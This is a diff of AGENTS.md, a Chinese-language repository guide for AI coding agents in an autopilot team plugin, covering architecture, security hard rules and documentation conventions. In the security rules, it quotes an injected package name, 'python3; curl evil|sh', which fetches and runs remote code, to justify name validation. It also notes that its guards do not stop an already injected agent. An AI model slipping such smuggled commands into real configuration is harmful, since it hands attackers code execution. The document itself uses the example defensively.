@@ -25,7 +25,7 @@ README.md           人类入口：功能、快速开始、Config 字段语义�
 AGENTS.md           本文件：AI 代理仓库指南（架构铁律、连带改动表、已知坑）
 PILOT.md            操作者 runbook：首次真实环境无人值守怎么跑、看什么、出事怎么办
 docs/               其余文档一律在此，见「文档规范」
-  design-interaction.md  「需求采集 → 文档先行 → 并行开发 → 重规划」交互流程规格（M0/M1 已实施，M2/M3 提案）
+  design-interaction.md  「需求采集 → 文档先行 → 并行开发 → 重规划」交互流程规格（M0–M2 已实施，M3 提案）
 src/
   index.ts        插件入口：四导出 name/inject/Config/apply，ctx.provide('autopilot')
   service.ts      AutopilotService —— 状态机宿主与全部编排（纯逻辑请落到 service/，别塞这里）
@@ -36,6 +36,9 @@ src/
     description.ts 任务描述组装：注入顺序与「所有权 > 教训 > 正文」的预算倒排
     contracts.ts  contract_create 的写前校验与渲染（id / 悬空依赖 / 成环 / 禁区 / 域数），纯函数不碰盘
     report.ts     完成报告渲染（落在 <stateDir>/completion.md）
+    views.ts      视图投影的纯映射（member/task/review Record → View），可脱离状态机单测
+    daemon.ts     守护循环的纯判定层（返工打满 / 空闲卡死 / 墙钟超限），升级副作用留在 service.ts
+    docflow.ts    文档审批链与问卷记录纯操作（draft 区读写 / sha256 钉与比对 / 升格 / 答案回写）；交互层（ask_human 等待唤醒、投递）留在 service.ts
   tools.ts        模型可见工具（defineTool 注册），每次变更 publish 一次快照
   vocab.ts        运行时枚举词表（ROLES / TASK_STATUSES / ESCALATION_REASONS …）+ `TICKET_ROUTE_PREFIX`（服务端路由与面板 fetch 唯一共用的事实）：零依赖、浏览器安全
   schema.ts       zod 形状真相 + `z.infer` 派生视图类型：视图与投影校验的唯一来源，只依赖 zod 与 vocab
@@ -102,8 +105,8 @@ tests/            helpers.ts（真 git fixture）+ integration / unattended / no
    - 重定向与 glob（`>`、`*`）**继续放行**：它们由同一个 shell 处理、不启动新进程，拦下来只打断正常配置而无安全收益。
    - `bootstrap.systemPackages` 会被拼进 `packageManagerCommand` 之后交给 shell，所以**每个包名都要过 `PACKAGE_NAME_RE`** —— 少了这步，`['python3; curl evil|sh']` 就让 pm 的白名单校验形同虚设（实测确认过它真的会执行）。
    - ⚠️ 仍然成立的事实：清单里有 `sh` / `node` / `ssh` / `docker` 时，白名单就等价于没开（`node -e` 即任意执行）。这道定位是**防人误配 + 留审计痕迹**，不是防一个已被注入的模型。
-3. **forbiddenPaths**：任何改动落地前都要查分支相对基线的 diff，三条路径共用 `assertNoForbiddenChanges`：`pr_sync`（比 `origin/base`）、reviewer approve（比本地 base）、`team_branch` 的 merge（比 target）。触及禁区直接拒绝并升级；**基线或源 ref 解析不出来时拒绝并升级，绝不静默放行**。默认禁区现在只剩 `['LICENSE']`（2026-08-29 变更，`AGENTS.md` / `.github/` 已移出）。⚠️ 移出 `.github/` 的代价：AI 团队改得了把关自己的 CI workflow，`requireCiGreen` 的考卷和答卷在同一支笔下面 —— 这条保护从「禁区硬阻断」降级为「单独成变更 + 人复核」，需要硬保证的项目请自己把 `.github/` 配回 `security.forbiddenPaths`。
-4. **门不过不合并**：`pushRequiresGates` 时门红禁 push/approve；`requireCiGreen` 是**另一道独立的门**（不再被 `pushRequiresGates` 短路），且 `ciStatus === null`（从未 `pr_sync`）视为未验证 → 禁 approve。注意：CI 状态只有 github 平台查得到，其它平台 `pr_sync` 恒置 `unknown`、该门自动不强制 —— 非 github 仓库请显式关掉 `requireCiGreen`，别以为它在保护你。
+3. **forbiddenPaths**：任何改动落地前都要查分支相对基线的 diff，三条路径共用 `assertNoForbiddenChanges`：`pr_sync`（比 `origin/base`）、reviewer approve（比本地 base）、`team_branch` 的 merge（比 target）。触及禁区直接拒绝并升级；**基线或源 ref 解析不出来时拒绝并升级，绝不静默放行**。默认禁区现在只剩 `['LICENSE']`（2026-08-29 变更，`AGENTS.md` / `.github/` 已移出）。⚠️ 移出 `.github/` 的代价与应对见 README「安全模型」3：需要硬保证的项目自己把它配回 `security.forbiddenPaths`。
+4. **门不过不合并**：`pushRequiresGates` 时门红禁 push/approve；`requireCiGreen` 是**另一道独立的门**（不再被 `pushRequiresGates` 短路），且 `ciStatus === null`（从未 `pr_sync`）视为未验证 → 禁 approve。注意：CI 状态仅 github 平台查得到（其它平台 `pr_sync` 恒置 `unknown`、该门自动不强制），非 github 仓库请显式关掉 `requireCiGreen`。
 5. **禁止破坏性 git**：不 force-push 共享分支（任务/成员分支仅限 `--force-with-lease`）、不 reset 共享分支、不删 base 分支。所有可变 git 操作（create / checkout / merge / delete / push）的分支名一律过 `assertSafeRef`：不得以 `-` 开头、不得含空格或 `..`，否则模型传一个 `-D` 就能把 `git branch -D <同事的任务分支>` 拼进 argv 静默删分支。
 6. **工单凭据只活在人手里**：token 存在 service 侧旁路表（`state.json.ticketTokens`，**内部记录字段**，不是视图字段 —— 所以 `stateVersion` 不动），只拼进邮件 / webhook 的文案。任何人往 `EscalationView` / `QuestionnaireView` / 投影上加 token 字段都是在把「谁能答这张工单」写进谁都能抄一份的地方，`tests/test-notification.ts` 会红。三个失败分支（未知 id / 缺凭据 / 围栏不过）**必须返回逐字节相同的 404**，绝不 403 —— 差别一旦不同，工单号就能被枚举。独立端口 `host` 非回环 → 启动即抛，不降级继续。⚠️ 诚实边界：同源信任围栏挡的是端口扫描、跨站表单和 DNS rebinding，**挡不住本机进程和已被注入的 agent**（与硬规则 2 同一定位）。
 
@@ -120,7 +123,7 @@ tests/            helpers.ts（真 git fixture）+ integration / unattended / no
 仓库根只留三份 `.md`：`README.md`（人类入口 + **配置字段语义的真相源**）、`AGENTS.md`（本文件 —— 工具按固定路径名找它，所以它必须在根）、`PILOT.md`（操作者 runbook）。**其余文档一律放 `docs/`，新文档也直接写在 `docs/` 下**，别先在根落脚再搬家。
 
 - **命名**：`docs/` 下用小写 kebab-case（`docs/design-interaction.md`）；SCREAMING-CASE 只属于根目录那三份历史入口。一篇只讲一个主题，同类攒到 3 篇以上再开子目录（如 `docs/adr/0001-<slug>.md`），不要三层嵌套。
-- **每篇开头**：H1 一句话说明这是什么，紧接一段 `>` 引用交代**状态**（提案 / 已实施 / 生效中）和**分工**（"配置语义以 README 为准、操作以 PILOT 为准"）。引用代码时写 `src/xxx.ts:123` 并注明基于哪个版本号 —— 行号会漂移，读者需要知道自己按哪版在读。
+- **每篇开头**：H1 一句话说明这是什么，紧接一段 `>` 引用交代**状态**（提案 / 已实施 / 生效中）和**分工**（"配置语义以 README 为准、操作以 PILOT 为准"）。引用代码时优先写**符号名**（函数 / 类 / 常量，如 `splitSegments`），不要引裸行号——行号会漂移，版本号也锚不住单文件内的改动。
 - **一处事实一处写**：配置字段 → README「配置」；架构与连带关系 → AGENTS.md；交互流程规格 → `docs/design-interaction.md`；怎么跑 → PILOT.md。别处要提就**链过去**，抄一份必然漂移。
 - **相对链接**：文档之间一律用 markdown 相对链接，从 `docs/` 指回根写 `../README.md`；`.tasks/*.md` 引设计文档写 `../docs/<name>.md`。
 - **不归本规范管**：`.tasks/*.md`（任务契约，目录写死在 `src/team.ts`，插件按它解析）、`<stateDir>/learnings.md` 与 `<stateDir>/completion.md`（运行态生成物，不入库）。别为了整齐把它们搬进 `docs/`。
@@ -133,7 +136,7 @@ tests/            helpers.ts（真 git fixture）+ integration / unattended / no
 - 团队阶段：`intake → kickoff_pending_approval → scaffolding → developing ⇄ replanning`。前三个阶段一律不派发（`dispatch` 门），只有 `developing` / `replanning` 会。`intake → kickoff_pending_approval` 由服务端推（需求问卷答完，或 `ask_human(kind: approval)` 把一份非空开工包标成待批），组长不能自己 `autopilot_phase` 越过去；`createTeam` 落在 `developing`（老 state.json 缺 `phase` 也兜底它）。
 - 问卷：`open → answered / expired / cancelled`。它与升级是两件事：一张 open 问卷让任务在面板上标「等人回答」，但**不**置 `needs-human`、不进升级直方图、不产生学习记录，并让 `checkStuck` 豁免这张任务（`checkBudget` 不豁免，所以永远没人答的单最终以 `budget-exceeded` 升级）。
 - 循环：`stopped / running / paused / escalated / completed`。崩溃恢复时持久化的 `running` 一律降为 `paused`，等 `autopilot_resume`。
-- 升级触发条件（命中即 escalate，禁止自行绕过）：需求矛盾 / 跨 3+ 域改动 / 需新增付费依赖或密钥 / 非本任务导致的门红 / 触及 forbiddenPaths / 返工超限 / 任务卡死 / 超出任务墙钟预算（`daemon.maxTaskHours`）/ 部署连续失败 / 引导失败。
+- 升级触发条件（命中即 escalate，禁止自行绕过）：**不在本文件抄清单**——语义口径以 README「无人值守主循环」末尾的清单为准，枚举真相源是 `src/vocab.ts` 的 `ESCALATION_REASONS`（新增分类走「改一处要连带改哪儿」表，两处各抄一份必然漂移过）。
 
 ## 改一处要连带改哪儿
 
@@ -146,7 +149,7 @@ tests/            helpers.ts（真 git fixture）+ integration / unattended / no
 | 新增 `EscalationReason` | `vocab.ts` 的 `ESCALATION_REASONS` → 字典 `reason.*`；⚠️ 先确认服务端真会产出它，无人产出的分类只会给模型多一个错选项 |
 | 新增 Config 字段 | `index.ts` 的 `Config` 接口与 schema → `service/options.ts` 的 `AutopilotOptions` → `apply()` 的映射 → README 配置块 → 需要时 `client/settings-card.tsx` |
 | 改 `profile.ts` 的约定 | 服务端默认值可能与 `ProjectProfile` 分叉，改前先核对 `README` 的 AgentDeploy 说明 |
-| 新增远端平台/PR 能力 | `github.ts` 适配层是否覆盖该平台 → `vocab.ts` 的 `CI_STATUSES`；⚠️ `remote.platform` 的 `'github' \| 'cnb' \| 'gitlab' \| 'generic'` 目前仍手抄在 `index.ts`（唯一残留的双写枚举，且非 github 无 CI 查询实现） |
+| 新增远端平台/PR 能力 | `github.ts` 适配层是否覆盖该平台 → `vocab.ts` 的 `CI_STATUSES` 与 `REMOTE_PLATFORMS`；⚠️ 类型三处（index.ts 接口 / options.ts）已由 `RemotePlatform` 单源，但 zod 侧的 `z.const` 字面量列表因 schemastery 无 enum 组合器仍需手动同步；且非 github 无 CI 查询实现 |
 | 改工单路由 / 题面与答案形状 | 前缀常量只有 `vocab.ts` 的 `TICKET_ROUTE_PREFIX` 一份（服务端与面板各自 import，写死两份必漂移）→ `ticket-handler.ts` 的前缀剥离与锚死正则 → 面板与服务端表单共用 `src/formmodel.ts`（改控件形态两边一起变）→ 面向人的文案 zh/en **同时**加 |
 | 移动 / 重命名 `.md` 文档 | 全仓库 grep 旧文件名并逐处改引用（README、`.tasks/*.md` 契约、`src/` 注释、`*.patch.yml`）；放哪儿、怎么命名见「文档规范」 |
 
@@ -156,10 +159,9 @@ tests/            helpers.ts（真 git fixture）+ integration / unattended / no
 2. **tsdown 的 `clean: false` 是故意的**：`lib/types`（tsc 产物）与 `lib`（打包产物）同目录，打开 clean 会把 d.ts 一起抹掉。
 3. **client 产物的 banner/footer 不能动**：`tsdown.config.ts` 用 `window.__ModuleLoader__.load(...)` 包裹 CJS 输出，改了 Loader 就加载不了插件。
 4. **测试用真实 git，不 mock**：`tests/helpers.ts` 用本地 bare 仓库扮演 remote。vitest 配了 `fileParallelism: false` + `pool: 'forks'`，别图快改成并行，会互相踩 worktree。
-5. **`smoke-cordis` 测的是构建产物**：它 import `../lib/index.js`，改完源码必须先 `pnpm build` 再跑，否则测的是旧产物。
-6. **设置卡片改动需重启**：`autopilot` 命名空间在插件加载时注册，设置页改配置要带 `--patch` 重启服务端才生效。
-7. **`autopilot-team` 预设是随包分发 + 运行时落盘的**：模板在 `preset/autopilot-team/`，`ensureAutopilotTeamPreset()` 在 `apply()` 时拷到用户预设根（缺失才拷、绝不覆盖）。预设目录盘点无缓存，落盘后刷新即见；但**自动建 `demo` 团队**的钩子在宿主 `lib/index.js`，改宿主代码后需重启服务端。
-8. **面板的工单路由是「可选注入」，不是顶层 `inject`**：`src/index.ts` 用 `ctx.inject(['webServer', 'webRuntime'], …)` 注册 prefix 路由。两个原因：顶层 `export const inject = ['tools']` 被 `tests/smoke-cordis.ts` 钉死；而顶层 inject 是**硬依赖**，无宿主 web 的 headless profile 会直接起不来。所以宿主不在 = 只是没有这条路由（独立端口照旧）。挂载外面包了一层 `logger.warn` —— 宿主 `register` 对重复 `(kind, path)` 会抛（HMR / 双装载场景），挂不上不该拖垮整个插件。
+5. **设置卡片改动需重启**：`autopilot` 命名空间在插件加载时注册，设置页改配置要带 `--patch` 重启服务端才生效。
+6. **`autopilot-team` 预设**：落盘机制见 README「Agent 预设」。坑只有一条——自动建 `demo` 团队的钩子在宿主 `lib/index.js`，改宿主代码后需重启服务端。
+7. **面板的工单路由是「可选注入」，不是顶层 `inject`**：`src/index.ts` 用 `ctx.inject(['webServer', 'webRuntime'], …)` 注册 prefix 路由。两个原因：顶层 `export const inject = ['tools']` 被 `tests/smoke-cordis.ts` 钉死；而顶层 inject 是**硬依赖**，无宿主 web 的 headless profile 会直接起不来。所以宿主不在 = 只是没有这条路由（独立端口照旧）。挂载外面包了一层 `logger.warn` —— 宿主 `register` 对重复 `(kind, path)` 会抛（HMR / 双装载场景），挂不上不该拖垮整个插件。
 
 ## 测试约定
 
